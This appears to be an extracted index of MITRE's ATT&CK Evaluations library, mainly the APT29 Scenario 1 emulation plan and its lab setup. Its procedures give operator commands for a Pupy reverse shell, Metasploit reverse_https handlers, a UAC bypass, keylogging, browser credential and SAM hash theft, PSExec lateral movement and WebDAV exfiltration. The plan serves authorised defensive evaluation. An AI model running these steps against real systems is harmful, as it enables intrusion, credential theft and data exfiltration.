[[{"i":"attck-evaluations-library","l":"ATT&CK Evaluations Library"},{"l":"Overview","p":["The ATT&CK Emulation Library includes a collection of adversary emulation plans used in published ATT&CK Evaluations.","Emulation plans are a comprehensive approach to emulating a specific adversary, e.g. Turla, from initial access through exfiltration. The plans are organized by evaluation and threat actor, and are designed to emulate a real breach from the designated adversary."]},{"l":"Emulation Plans","p":["Active since at least 2006, (aka APT10) is a threat group believed to be sponsored by the Chinese Ministry of State Security (MSS).","ALPHV BlackCat","ALPHV BlackCat, also known as Noberus, was a prolific Russian-speaking, ransomware-as-a-service (RaaS) group that emerged in 2021 and was linked to BlackMatter, DarkSide, REvil, and other RaaS groups.","APT29","APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives appear to align with the interests of the Russian Federation.","Blind Eagle","Blind Eagle is a South American threat actor focused on Colombia-based institutions, including entities in the financial, manufacturing, and petroleum sectors. Largely opportunistic in their motives, Blind Eagle leverages commodity RATs modified to fit the environment.","Carbanak Group","Carbanak is a threat group who has been found to manipulate financial assets, such as by transferring funds from bank accounts or by taking over ATM infrastructures.","Enterprise 2019","Enterprise 2021","Enterprise 2022","Enterprise 2023","Evaluation Results and More Information","FIN7","FIN7 is a financially-motivated threat group that has been associated with malicious operations dating back to late 2015. The group is characterized by their persistent targeting and large-scale theft of payment card data from victim systems.","Full Emulation Plans","Intelligence Summary","Managed Services 2022","Managed Services 2023","menuPass","OilRig","OilRig is a cyber threat actor with operations aligning to the strategic objectives of the Iranian government. OilRig has been operational since at least 2014 and has a history of widespread impact, with operations directed against financial, government, energy, chemical, telecommunications and other sectors around the globe.","Research Presentation. Becoming a Dark Knight: Adversary Emulation Demonstration for ATT&CK Evaluations","Sandworm","Sandworm Team is a destructive threat group attributed to Russia's General Staff of the Armed Forces, Main Intelligence Directorate (GRU) that has been reportedly active since 2009. Sandworm is known for conducting large scale, well funded, destructive, and aggressive campaigns such as Olympic Destroyer, CrashOverride/Industroyer, and NotPetya.","Turla","Turla is a sophisticated Russian-based threat group that has infected victims in more than 50 countries, and active since at least the early 2000s. Turla leverages novel techniques and custom tooling and open-source tools to elude defenses and persist on target networks...","Wizard Spider","Wizard Spider is a Russia-based e-crime group originally known for the Trickbot banking malware. In August 2018, Wizard Spider added capabilities to their Trickbot software enabling the deployment of the Ryuk ransomware. This resulted in \"big game hunting\" campaigns, focused on targeting large organizations for high-ransom return rates."]},{"l":"Directory Structure","p":["Each emulation plan focuses on a specific named threat actor. The README of each individual plan provides a curated summary of available cyber threat intelligence, composed of an intelligence overview of the actor (describing who they target, how, and why where possible) as well as the scope of their activity (i.e. breadth of techniques and malware used). All presented information is cited back to relevant publicly available cyber threat intelligence and communicated and annotated via ATT&CK.","Within each emulation plan, the operational flow provides a high-level summary of the captured scenario(s). These scenarios will vary based on the adversary and available intelligence, but typically follow a sequential progression of how the actor breaches then works towards achieving their operational objectives within a victim environment (espionage, data/system destruction, etc.).","The content to execute the scenario(s) is broken down into step-by-step procedures provided in both human and machine-readable formats. Scenarios can be executed end-to-end or as individual tests. The human-readable formats provide additional relevant background where possible as well as any setup prerequisites, while the machine-readable format is designed to be programmatically parsed (ex: read, reformatted, and ingested into an automated agent, such as CALDERA and/or breach simulation frameworks)."]}],[{"l":"APT29","p":["This adversary emulation plan is derived from the original APT29 content developed and used in the 2019 ATT&CK Evaluations.","APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives appear to align with the interests of the Russian Federation. 1, 14 The group is reported to have been operating as early as 2008 and may have logged operational successes as recently as 2020.","The Intelligence Summary summarizes 16 publicly available sources as well as the results of an open call for contributions, to describe APT29, their motivations, objectives, and observed target industries. It further describes a representative APT29 Operational Flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occur across APT29 operations. In the case of APT29, we break out their operations into two distinct scenarios:","Scenario 1: This scenario starts with a \"smash-and-grab\" then rapid espionage mission that focuses on gathering and exfiltrating data, before transitioning to stealthier techniques to achieve persistence, further data collection, credential access, and lateral movement. The scenario ends with the execution of previously established persistence mechanisms.","Scenario 2: This scenario consists of a stealthier and slower approach to compromising the initial target, establishing persistence, harvesting credentials, then finally enumerating and compromising the entire domain. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","The APT29 emulation plan is a human-readable, step-by-step / command-by-command implementation of APT29 TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios, as defined in the Operations Flow. The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes all steps, commands, and syntax for both Scenario 1 and Scenario 2. The YAML template was nuanced to ensure that each step within the YAML is directly coupled with its equivalent in the human-readable version."]},{"l":"Resources","p":["Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Kaspersky","Microsoft","SentinelOne"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2021 MITRE Engenuity. Approved for public release. Document number AT0008.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"APT29 Adversary Emulation","p":["This adversary emulation plan is derived from the original APT29 content developed and used in the 2019 ATT&CK Evaluations.","APT29 is thought to be an organized and well-resourced cyber threat actor whose collection objectives appear to align with the interests of the Russian Federation. 1, 14 The group is reported to have been operating as early as 2008 and may have logged operational successes as recently as 2020.","The Intelligence Summary summarizes 16 publicly available sources as well as the results of an open call for contributions, to describe APT29, their motivations, objectives, and observed target industries. It further describes a representative APT29 Operational Flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occur across APT29 operations. In the case of APT29, we break out their operations into two distinct scenarios:","Scenario 1: This scenario starts with a \"smash-and-grab\" then rapid espionage mission that focuses on gathering and exfiltrating data, before transitioning to stealthier techniques to achieve persistence, further data collection, credential access, and lateral movement. The scenario ends with the execution of previously established persistence mechanisms.","Scenario 2: This scenario consists of a stealthier and slower approach to compromising the initial target, establishing persistence, harvesting credentials, then finally enumerating and compromising the entire domain. The scenario ends with a simulated time-lapse where previously established persistence mechanisms are executed.","The APT29 emulation plan is a human-readable, step-by-step / command-by-command implementation of APT29 TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios, as defined in the Operations Flow. The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes all steps, commands, and syntax for both Scenario 1 and Scenario 2. The YAML template was nuanced to ensure that each step within the YAML is directly coupled with its equivalent in the human-readable version."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Kaspersky","Microsoft","SentinelOne"]},{"l":"Table of Contents","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 MITRE Engenuity. Approved for public release. Document number AT0008.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Scenario 1"},{"l":"Preface","p":["APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives."]},{"l":"Overview","p":["Emulation of APT29 usage of tools such as CosmicDuke, MiniDuke, SeaDuke/SeaDaddy, CozyDuke/CozyCar, and Hammertoss","Scenario begins after delivery of a reverse shell payload via opportunistic, widespread phishing","\"Smash-and-grab\" style collection and exfiltration before deciding the target may be of future value and deploying stealthier malware for long term exploitation","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Contents","p":["Step 1 - Initial Breach","Step 2 - Rapid Collection and Exfiltration","Step 3 - Deploy Stealth Toolkit","Step 4 - Defense Evasion and Discovery","Step 5 - Persistence","Step 6 - Credential Access","Step 7 - Collection and Exfiltration","Step 8 - Lateral Movement","Step 9 - Collection","Step 10 - Persistence Execution","Acknowledgements"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 1 Infrastructure documentation."]},{"i":"step-1---initial-breach","l":"Step 1 - Initial Breach","p":["The scenario begins with an initial breach, where a legitimate user clicks ( T1204/ T1204.002) an executable payload (screensaver executable) masquerading as a benign word document ( T1036/ T1036.002). Once executed, the payload creates a C2 connection over port 1234 ( T1065) using the RC4 cryptographic cipher. The attacker then uses the active C2 connection to spawn interactive cmd.exe ( T1059/ T1059.003) and powershell.exe ( T1086/ T1059.001)."]},{"l":"Procedures"},{"i":"1a---user-execution-malicious-file-t1204--t1204002","l":"1.A - User Execution: Malicious File (T1204 / T1204.002)","p":["Login to victim workstation.","Double click 3aka3.doc on Desktop","This will send a reverse shell to the Pupy C2 server."]},{"i":"1b---command-and-scripting-interpreter-powershell-t1086--t1059001","l":"1.B - Command and Scripting Interpreter: PowerShell (T1086 / T1059.001)","p":["From Pupy C2 server:","[pupy] > shell","[pupy (CMD)] > powershell"]},{"l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDukeâs infection payloads have started by tricking victims into opening a Windows executable whose filename is manipulated to look like an image file using the Right-to-Left Override (RLO) feature. CosmicDuke has also used RC4 to decrypt incoming data and encrypt outgoing data. 2","SeaDuke and CozyDuke have used the RC4 cipher to encrypt data. 4, 7, 13, 15","CozyDuke can be used to spawn a command line shell. 15"]},{"i":"step-2---rapid-collection-and-exfiltration","l":"Step 2 - Rapid Collection and Exfiltration","p":["The attacker runs a one-liner command to search the filesystem for document and media files ( T1083, T1119), collecting ( T1005) and compressing ( T1002/ T1560.001) content into a single file. The file is then exfiltrated over the existing C2 connection ( T1041)."]},{"i":"procedures-1","l":"Procedures"},{"i":"2a---collection-t1119-t1005-t1002--t1560001","l":"2.A - Collection (T1119, T1005, T1002 / T1560.001)","p":["Paste the following PowerShell 1-liner into the Pupy terminal:","[pupy (PowerShell)] >","[pupy (PowerShell)] > exit","[pupy (CMD)] > exit"]},{"i":"2b---exfiltration-over-c2-channel-t1041","l":"2.B - Exfiltration Over C2 Channel (T1041)","p":["[pupy] > download C:\\Users\\username\\AppData\\Roaming\\Draft.Zip ."]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDukeâs information stealing functionality included stealing user files with file extensions that match a predefined list. 1, 2"]},{"i":"step-3---deploy-stealth-toolkit","l":"Step 3 - Deploy Stealth Toolkit","p":["The attacker now uploads a new payload ( T1105) to the victim. The payload is a legitimately formed image file with a concealed PowerShell script ( T1027/ T1027.003). The attacker then elevates privileges via a user account control (UAC) bypass ( T1122/ T1546.015, T1088/ T1548.002), which executes the newly added payload. A new C2 connection is established over port 443 ( T1043 using the HTTPS protocol ( T1071/ T1071.001, T1032/ T1573). Finally, the attacker removes artifacts of the privilege escalation from the Registry ( T1112)."]},{"i":"procedures-2","l":"Procedures"},{"i":"3a---ingress-tool-transfer-t1105","l":"3.A - Ingress Tool Transfer (T1105)","p":["Start Metasploit handler:","[msf] > handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https","From Pupy, upload monkey.png to target:","[pupy] > upload /tmp/monkey.png C:\\Users\\username\\Downloads\\monkey.png[pupy] > shell[pupy CMD] > powershell"]},{"i":"3b---abuse-elevation-control-mechanism-bypass-user-access-control-t1088--t1548002","l":"3.B - Abuse Elevation Control Mechanism: Bypass User Access Control (T1088 / T1548.002)","p":["[pupy (PowerShell)] >","Paste the following 1-liner when prompted for value:","When prompted for value, press: [Enter]","[pupy (PowerShell)] > exit[pupy (CMD)] > %windir%\\system32\\sdclt.exe[pupy CMD] > powershell","You should receive a high integrity Meterpreter callback."]},{"i":"3c---modify-registry-t1112","l":"3.C - Modify Registry (T1112)","p":["[pupy (PowerShell)] > Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force[pupy (PowerShell)] > exit[pupy (CMD)] > exit"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft","CosmicDuke has occasionally embedded other malware components that are written to disk and executed. 1","MiniDuke has transferred additional backdoors onto a system via GIF files. 3","SeaDaddy/SeaDuke may support HTTPS/SSL network communications. 4, 13","APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ( S0195). APT29 has also bypassed UAC to elevate privileges. 5","HAMMERTOSS has embedded pictures with commands using steganography. 6"]},{"i":"step-4---defense-evasion-and-discovery","l":"Step 4 - Defense Evasion and Discovery","p":["The attacker uploads additional tools ( T1105) through the new, elevated access before spawning an interactive powershell.exe shell ( T1086/ T1059.001). The additional tools are decompressed ( T1140) and positioned on the target for usage. The attacker then enumerates running processes ( T1057) to discover/terminate the initial access from Step 1 before deleting various files ( T1107/ T1070.004) associated with that access. Finally, the attacker launches a PowerShell script that performs a wide variety of reconnaissance commands ( T1016, T1033, T1063/ T1518.001, T1069, T1082, T1083), some of which are done by accessing the Windows API ( T1106)."]},{"i":"procedures-3","l":"Procedures"},{"i":"4a---ingress-tool-transfer-t1105","l":"4.A - Ingress Tool Transfer (T1105)","p":["From Metasploit:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >","[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite\\"]},{"i":"4b---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"4.B - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Terminate Pupy RAT process:","[meterpreter (PowerShell)*] > Get-Process","[meterpreter (PowerShell)*] > Stop-Process -Id rcs.3aka3.doc PID -Force","You may now close Pupy.","From Metasploit:","[meterpreter (PowerShell)*] > Gci $env:userprofile\\Desktop","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Desktop\\?rcs.3aka.doc","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:APPDATA\\Draft.Zip","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Downloads\\SysinternalsSuite.zip","Import custom script, readme.ps1:","[meterpreter (PowerShell)*] > Move-Item .\\readme.txt readme.ps1","[meterpreter (PowerShell)*] > . .\\readme.ps1"]},{"i":"4c---discovery-t1016-t1033-t1063--t1518001-t1069-t1082-t1083","l":"4.C - Discovery (T1016, T1033, T1063 / T1518.001, T1069, T1082, T1083)","p":["[meterpreter (PowerShell)*] > Invoke-Discovery"]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne","CozyDuke has been instructed to download and execute other executables, which in some cases included common hacking tools such as PSExec ( S0029). 1","MiniDuke can download and execute new malware and lateral movement tools. 3","APT29 has removed tools and forensic artifacts to hide activity. 5, 7, 13","CozyDuke can be used to spawn a command line shell. 15"]},{"i":"step-5---persistence","l":"Step 5 - Persistence","p":["The attacker establishes two distinct means of persistent access to the victim by creating a new service ( T1031/ T1543.003) and creating a malicious payload in the Windows Startup folder ( T1060/ T1547.001)."]},{"i":"procedures-4","l":"Procedures"},{"i":"5a---create-or-modify-system-process-windows-service-t1031--t1543003","l":"5.A - Create or Modify System Process: Windows Service (T1031 / T1543.003)","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 1"]},{"i":"5b---boot-or-logon-autostart-execution-registry-run-keys--startup-folder-t1060--t1547001","l":"5.B - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1060 / T1547.001)","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 2"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke has installed a Windows service to achieve persistence on a system. 2","SeaDuke has the ability to persist using a .lnk file stored in the Startup directory. 4","APT29 has used several persistence mechanisms, including .LNK files. 5"]},{"i":"step-6---credential-access","l":"Step 6 - Credential Access","p":["The attacker accesses credentials stored in a local web browser ( T1081/ T1552.001, T1003/ T1555.003) using a tool renamed to masquerade as a legitimate utility ( T1036/ T1036.005). The attacker then harvests private keys ( T1145/ T1552.004) and password hashes ( T1003/ T1003.002)."]},{"i":"procedures-5","l":"Procedures"},{"i":"6a---credentials-from-password-stores-credentials-from-web-browsers-t1003--t1555003","l":"6.A - Credentials from Password Stores: Credentials from Web Browsers (T1003 / T1555.003)","p":["Execute chrome-password collector:","[meterpreter (PowerShell)*] > C:\\Program Files\\SysinternalsSuite\\accesschk.exe"]},{"i":"6b---unsecured-credentials-private-keys-t1145--t1552004","l":"6.B - Unsecured Credentials: Private Keys (T1145 / T1552.004)","p":["Steal PFX certificate:","[meterpreter (PowerShell)*] > Get-PrivateKeys","[meterpreter (PowerShell)*] > exit"]},{"i":"6c---os-credential-dumping-security-account-manager-t1003--t1003002","l":"6.C - OS Credential Dumping: Security Account Manager (T1003 / T1003.002)","p":["Dump password hashes:","[meterpreter*] > run post/windows/gather/credentials/credential_collector"]},{"i":"cited-intelligence-5","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, SentinelOne","CosmicDukeâs information stealing functionality has included exporting userâs cryptographic certificates, including private keys, and collecting user credentials, including passwords from web browsers (ex: Google Chrome). CozyDuke has contained modules that can steal NTLM hashes as well as capture screenshots. 1, 2"]},{"i":"step-7---collection-and-exfiltration","l":"Step 7 - Collection and Exfiltration","p":["The attacker collects screenshots ( T1113), data from the userâs clipboard ( T1115), and keystrokes ( T1056/ T1056.001). The attacker then collects files ( T1005), which are compressed and encrypted ( T1560/ T1560.001), before being exfiltrated to an attacker-controlled WebDAV share ( T1048/ T1048)."]},{"i":"procedures-6","l":"Procedures"},{"i":"7a---user-monitoring-t1113-t1115-t1056--t1056001","l":"7.A - User Monitoring (T1113, T1115, T1056 / T1056.001)","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite","[meterpreter (PowerShell)*] > Move-Item .\\psversion.txt psversion.ps1","[meterpreter (PowerShell)*] > . .\\psversion.ps1","[meterpreter (PowerShell)*] > Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName Screenshot","From the Windows victim, type text and copy to the clipboard.","[meterpreter (PowerShell)*] > Get-Clipboard","[meterpreter (PowerShell)*] > Keystroke-Check","[meterpreter (PowerShell)*] > Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName Keystrokes","From victim system, enter keystrokes.","View keylog output from Metasploit:","[meterpreter (PowerShell)*] > View-Job -JobName Keystrokes[meterpreter (PowerShell)*] > Remove-Job -Name Keystrokes -Force[meterpreter (PowerShell)*] > Remove-Job -Name Screenshot -Force"]},{"i":"7b---compression-and-exfiltration-t1048-t1002-t1022--t1560001","l":"7.B - Compression and Exfiltration (T1048, T1002, T1022 / T1560.001)","p":["[meterpreter (PowerShell)*] > Invoke-Exfil"]},{"i":"cited-intelligence-6","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDukeâs information stealing functionality has included keylogging, taking screenshots, and stealing clipboard contents. Collected data can be exfiltrated using WebDAV. 1, 2","CozyDuke can be used to take screenshots of a full desktop window and encrypt collected data. 15"]},{"i":"step-8---lateral-movement","l":"Step 8 - Lateral Movement","p":["The attacker uses Lightweight Directory Access Protocol (LDAP) queries to enumerate other hosts in the domain ( T1018) before creating a remote PowerShell session to a secondary victim ( T1021/ T1021.006). Through this connection, the attacker enumerates running processes ( T1057). Next, the attacker uploads ( T1105) a new UPX-packed payload ( T1027/ T1027.002) to the secondary victim. This new payload is executed on the secondary victim via the PSExec utility ( T1021/ T1021.002, T1035/ T1569.002) using the previously stolen credentials ( T1078/ T1078.002)."]},{"i":"procedures-7","l":"Procedures"},{"i":"8a---remote-services-windows-remote-management-t1021--t1021006","l":"8.A - Remote Services: Windows Remote Management (T1021 / T1021.006)","p":["Copy payload to webdav share:","[user@attacker]# cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/[user@attacker]# cd /var/www/webdav[user@attacker]# chown -R www-data:www-data python.exe","Switch back to Meterpreter shell:","[meterpreter (PowerShell)*] > Ad-Search Computer Name *","[meterpreter (PowerShell)*] >","Note the session ID for step 8C."]},{"i":"8b---ingress-tool-transfer-t1105","l":"8.B - Ingress Tool Transfer (T1105)","p":["Start a new instance of Metasploit, and spawn a Metasploit handler:","[bash] > msfconsole","[msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https","Return to current Meterpreter session:","[meterpreter (PowerShell)*] > Invoke-SeaDukeStage -ComputerName victim 2 IP"]},{"i":"8c---system-services-service-execution-t1035--t1569002","l":"8.C - System Services: Service Execution (T1035 / T1569.002)","p":["Execute SEADUKE Remotely via PSEXEC","[meterpreter (PowerShell)*] >","You should receive a callback in your other Metasploit terminal."]},{"i":"cited-intelligence-7","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","SeaDuke has been written in Python and has been delivered through the CozyDuke toolkit. 1, 13","SeaDuke/SeaDaddy samples have been UPX-packed. 4, 5, 12","APT29 has UPX-packed and used SMB to transfer files. 5","APT29 has used UPX-packed, Python-compiled backdoors. 7"]},{"i":"step-9---collection","l":"Step 9 - Collection","p":["The attacker uploads additional utilities to the secondary victim ( T1105) before running a PowerShell one-liner command ( T1059/ T1059.001) to search for filesystem for document and media files ( T1083, T1119). Files of interested are collected ( T1005) then encrypted and compressed ( T1002, T1022/ T1560.001 into a single file ( T1074/ T1074.001). The file this then exfiltrated over the existing C2 connection ( T1041). Finally, the attacker deletes various files ( T1107/ T1070.004) associated with that access."]},{"i":"procedures-8","l":"Procedures"},{"i":"9a---ingress-tool-transfer-t1105","l":"9.A - Ingress Tool Transfer (T1105)","p":["From the second Metasploit terminal:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >"]},{"i":"9b---collection-and-exfiltration-t1005-t1041-t1002--t1022--t1560001","l":"9.B - Collection and Exfiltration (T1005, T1041, T1002, T1022 / T1560.001)","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Windows\\Temp","[meterpreter (PowerShell)*] > .\\Rar.exe a -hpfGzq5yKw $env:USERPROFILE\\Desktop\\working.zip $env:APPDATA\\working.zip","[meterpreter (PowerShell)*] > exit","[meterpreter*] > download C:\\\\Users\\\\username\\\\Desktop\\\\working.zip ."]},{"i":"9c---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"9.C - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["[meterpreter*] > shell","[meterpreter (Shell)*] > cd C:\\Windows\\Temp","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Windows\\Temp\\Rar.exe","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\AppData\\Roaming\\working.zip","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\Desktop\\working.zip","[meterpreter (Shell)*] > del C:\\Windows\\Temp\\sdelete64.exe","Terminate Session","[meterpreter (Shell)*] > exit[meterpreter*] > exit msf> exit"]},{"i":"cited-intelligence-8","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne","CosmicDukeâs information stealing functionality has included stealing user files with file extensions that match a predefined list and exfiltrating collected data via HTTPS. SeaDuke can execute command such as uploading and downloading files. 1, 2","MiniDuke can download and execute new malware and lateral movement tools. 3","SeaDuke has contained commands to download and Base-64-encode files. 4","APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ( S0195). 5, 7, 13","SeaDaddy has used RAR to archive collected data. 7","CozyDuke can be used to take screenshots of a full desktop window and encrypt collected data. 15"]},{"i":"step-10---persistence-execution","l":"Step 10 - Persistence Execution","p":["The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the new service ( T1035/ T1569.002) and payload in the Windows Startup folder ( T1060/ T1547.001). The payload in the Startup folder executes a follow-on payload using a stolen token ( T1106, T1134/ T1134.002)."]},{"i":"procedures-9","l":"Procedures"},{"i":"10a---system-services-service-execution-t1035--t1569002","l":"10.A - System Services: Service Execution (T1035 / T1569.002)","p":["Reboot Windows victim 1; wait for system to boot up","You should receive a callback with SYSTEM permissions from the javamtsup service"]},{"i":"10b---boot-or-logon-autostart-execution-registry-run-keys--startup-folder-t1060--t1547001","l":"10.B - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1060 / T1547.001)","p":["Trigger the Startup Folder persistence by logging in to Windows victim 1"]},{"i":"cited-intelligence-9","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke has installed persistence services that duplicate and uses the process token of explorer.exe to start the malware. 2"]},{"l":"Acknowledgments"},{"l":"Special thanks to the following public resources","p":["Metasploit ( https://github.com/rapid7/metasploit-framework)","Pupy ( https://github.com/n1nj4sec/pupy)","Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage)","Microsoft Sysinternals ( https://docs.microsoft.com/en-us/sysinternals/)"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by APT29. The infrastructure listed below is specific to Scenario 1. The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating APT29 to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server.","Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]},{"l":"Emulation Team Infrastructure","p":["Attack Platform: tested and executed on Ubuntu 18.04.3 LTS","C2 Framework","Pupy","Metasploit Framework","Chrome Password Dumper","Sysinternals Suite Zip file","WebDAV Share","Redirector: tested and executed on Ubuntu 18.04.3 LTS","Socat","Windows Attack Platform: Windows 10 x64 version 1903","Invoke-PSImage","Python 3","PyInstaller","Note: The Windows attack platform is only required if you would like to compile the Scenario 1 payloads. If you use the pre-compiled payloads, you do not need this system."]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Attack Platform","192.168.0.4","Redirector","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes four payloads that model APT29 malware.","The payloads are customized variants of reverse shells from Pupy RAT and Metasploit.","Pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.","If you would like to build the payloads yourself, please see payload_configs.md for further instructions."]},{"i":"setup-redirector-19216805-or-the-value-used-for-the-redirector-ip","l":"Setup Redirector: 192.168.0.5 (or the value used for the Redirector IP)","p":["From the redirector system, setup port forwarding using Socat."]},{"i":"setup-attack-platform-19216804","l":"Setup Attack Platform: 192.168.0.4","p":["Download Chrome password dumper tool from: https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe","Download SysInternals zip folder from: https://download.sysinternals.com/files/SysinternalsSuite.zip","Unzip SysinternalsSuite.zip; copy the following files into the SysInternalsSuite directory:","readme.txt","psversion.txt","chrome-passwords.exe(renamed as accessChk.exe)","strings64.exe(compiled from hostui.cpp)","Zip modified SysinternalsSuite folder","Install Pupy and Metasploit on Attack Platform by running install_day1_tools.sh","Start Pupy docker container then the EC4 listener","sudo pupy/start-compose.sh","listen -a ec4"]},{"l":"Target Infrastructure","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined","Same local administrator account on both Windows workstations","Google Chrome Web Browser must be available on one of the victim workstations"]},{"l":"Target Infrastructure Configuration"},{"l":"For each of the 2 target workstations","p":["Login in as user with administrator privileges","Ensure Windows Defender is off or configured to alert-only","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Verify user has read/write/execute permissions in the C:\\Windows\\Temp directory","Install Google Chrome ( https://www.google.com/chrome/); cache credentials in Chrome password manager","Import-PFX certificate found in shockwave.local.pfx. Instructions below:"]},{"l":"Import PFX Certificate","p":["Step 6.B of this emulation models theft of Private Keys.","Copy the PFX certificate located in the shockwave.local.pfx file to the Windows victims.","Import the certificate using 